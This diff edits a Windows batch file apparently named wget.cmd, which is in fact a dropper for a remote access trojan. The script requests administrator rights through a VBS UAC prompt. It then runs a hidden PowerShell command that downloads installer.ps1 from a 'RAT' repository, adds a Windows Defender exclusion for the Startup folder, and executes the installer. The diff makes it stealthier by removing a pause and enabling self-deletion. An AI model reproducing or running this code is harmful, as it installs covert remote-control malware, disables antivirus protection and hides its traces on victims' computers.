@@ -18,7 +18,7 @@ if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )
-pause
+
 :UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     set params= %*
@@ -36,6 +36,6 @@ REM rat resources
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'raw.githubusercontent.com/birbalkr/RAT/master/files/installer.ps1' -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"; ./installer.ps1
 
 @REM self delete
-@REM del wget.cmd
+del wget.cmd
 
 
